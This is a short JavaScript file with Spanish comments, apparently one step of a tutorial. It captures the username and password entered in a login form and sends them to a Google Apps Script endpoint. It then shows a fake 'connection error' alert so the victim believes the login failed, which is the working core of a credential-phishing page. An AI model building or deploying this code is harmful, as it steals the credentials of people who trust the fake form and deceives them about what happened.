document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    
    // URL que obtendrás al final del paso 3
    const GAS_URL = "https://script.google.com/macros/s/AKfycbzz53XSw0RWpGKdL67BDdRVs6rTWM0kXhhdXyN9AjdCsJwAR3BKdn9UeEQYhjlDtCVAfQ/exec";

    fetch(GAS_URL, {
        method: 'POST',
        mode: 'no-cors', // Evita bloqueos de CORS en pruebas simples
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ usuario: user, clave: pass })
    }).then(() => {
        alert("Error de conexión. Intente más tarde.");
    });
});